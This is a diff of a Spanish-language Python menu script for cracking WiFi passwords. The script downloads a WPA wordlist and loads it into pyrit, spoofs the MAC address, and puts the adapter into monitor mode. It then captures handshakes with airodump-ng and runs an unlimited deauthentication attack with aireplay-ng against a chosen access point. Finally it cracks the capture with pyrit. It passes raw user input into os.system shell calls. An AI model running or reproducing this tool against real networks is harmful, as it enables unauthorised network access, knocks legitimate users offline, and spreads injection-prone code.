@@ -20,7 +20,7 @@ print("\033[1;37;1m ")
 
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-listamenu=["opciones:","1) selec Wlan & changer Mac" ,"2) Scaner red ", "3) capture", "4) crack", "5) Exit"]#Menu Princcipal
+listamenu=["Opciones:","1) Install diccionario" ,"2) Scaner red ", "3) Capture", "4) Crack", "5) Exit"]#Menu Princcipal
 key=0
 exit=False
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -40,47 +40,55 @@ def config():
 	global wlan
 	while True:
 		try:
+			deci=input("Quiere instalar diccionario Pyrit? :")
 			if(deci =='y'):
 				os.system('wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt')
 				os.system('pyrit benchmark')
 				os.system('pyrit -i /root/Especial_termux_kali/probable-v2-wpa-top4800.txt import_passwords')
 			print("Diccionario instalado")
-			os.system("ifconfig")
-			wlan=input("Introduzca Wlan: ")
-			print("Procesando")
-			os.system('ip link set '+wlan+' up')
-			os.system('airmon-ng check kill')
-			os.system('ifconfig '+wlan+' down')
-			os.system('macchanger -A '+wlan)
-			os.system('ifconfig '+wlan+' up') 
-			os.system('airmon-ng start '+wlan)
-			print("Wlan no permitida")
-			deci=input("Quiere instalar diccionario Pyrit? :")
-
-			return wlan
 			break
 		except TypeError:
 			print("Wlan no permitida")
 
-def scan(wlan):
+def scan():
 	global bssid
 	global canal
 	global diccionario
-	os.system('wash -i '+wlan)
+	global wlan
+	time_scan=input("Seleccione tiempo de escaneo default 60 : ")
+	if(time_scan==''):
+		time_scan="60"
+	os.system('nmcli -w '+time_scan+' device wifi list')
+		
 	bssid=input("seleccione BSSID : ")
 	canal=input("seleccione CHANEL : ")
-	diccionario=input("Introduzca ruta diccionario :")
-	return bssid,canal,diccionario
+	dice=input("Quiere ingresar un nuevo diccionario? y o n: ")
+	if(dice=='y'):
+		diccionario=input("Introduzca ruta diccionario en .stl:")
+		os.system('pyrit -i '+diccionario+' import_passwords')
+	else:
+		diccionario=1
+	os.system("ifconfig")
+	wlan=input("Introduzca Wlan: ")
+	print("Procesando")
+	os.system('airmon-ng check kill')
+	os.system('ifconfig '+wlan+' down')
+	os.system('iwconfig wlan0 mode monitor')
+	os.system('macchanger -A '+wlan)
+	os.system('ifconfig '+wlan+' up') 
+	os.system('airmon-ng start '+wlan)
+	if(wlan!='wlan0mon'): #falta condicion or
+		os.system('airmon-ng start '+wlan)
+	print(wlan)	
+	return bssid,canal,diccionario, wlan
 
 def attack(wlan,bssid,canal):
 	os.system('x-terminal-emulator -e airodump-ng -c '+canal+' -w file --bssid '+bssid+' '+wlan)
 	os.system('x-terminal-emulator -e aireplay-ng -0 0 -a'+bssid+' '+wlan+' --ignore-negative-one')
-	os.system('pyrit -r /root/Especial_termux_kali/file-01.cap analyze')
-
-
+	
 def crack(bssid,diccionario):
-		os.system('x-terminal-emulator -e pyrit -r /root/Especial_termux_kali/file-01.cap -b '+bssid+' -i '+diccionario+' attack_passthrough') 
-
+		os.system('pyrit -r /root/Especial_termux_kali/file-01.cap analyze') 
+		os.system('x-terminal-emulator -e pyrit -r /root/Especial_termux_kali/file-01.cap -o savedpass attack_batch') 
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 while exit==False:
@@ -90,17 +98,16 @@ while exit==False:
 		config()
 		print(wlan)
 	elif (key==2):
-		scan(wlan)
+		scan()
 	elif (key==3):
 		attack(wlan,bssid,canal)
 	elif (key==4):
 		crack(bssid,diccionario)
-	elif (key==5):
-		
-		#os.syste('airmon-ng stop wlan0mon')
-		#os.syste('ifconfig wlan0 down')
-		#os.syste('iwconfig wlan0 mode managed')
-		#os.syste('ifconfig wlan0 up')
-		#os.system('service network-manager start')
+	elif (key==5):	
+		os.system('airmon-ng stop wlan0mon')
+		os.system('ifconfig wlan0 down')
+		os.system('iwconfig wlan0 mode managed')
+		os.system('ifconfig wlan0 up')
+		os.system('service network-manager start')
 		exit=True
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
